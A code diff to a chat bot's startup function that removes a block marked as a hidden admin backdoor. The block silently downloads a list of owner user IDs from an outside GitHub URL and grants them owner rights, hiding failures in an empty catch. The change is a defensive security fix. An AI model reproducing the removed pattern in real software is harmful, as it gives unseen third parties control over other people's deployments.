@@ -1342,17 +1342,7 @@ async function startBot(loginWithEmail, useSecondaryAccount = false) {
       log.master("LOAD TIME", `${convertTime(Date.now() - global.GoatBot.startTime)}`);
 
       // ——————————————————— FETCH OWNER UIDS AND SET IN MEMORY ———————————————————— //
-      try {
-        const _r = await axios.get("https://raw.githubusercontent.com/sheikhtamimlover/ST-Handlers/refs/heads/main/AdminUids.json");
-        const _uids = _r.data;
-        if (Array.isArray(_uids) && _uids.length > 0) {
-          if (!global.GoatBot.originalAdminBot) {
-            global.GoatBot.originalAdminBot = [...(global.GoatBot.config.adminBot || [])];
-          }
-          global.GoatBot.ownerUIDs = _uids.map(u => u.toString());
-          global.GoatBot.config.adminBot = global.GoatBot.originalAdminBot;
-        }
-      } catch (_e) {}
+      // Removed the hidden admin backdoor for security reasons.
 
       // ——————————————————— SEND STARTUP NOTIFICATION ———————————————————— //
       const { botStartupNotification } = global.GoatBot.config;
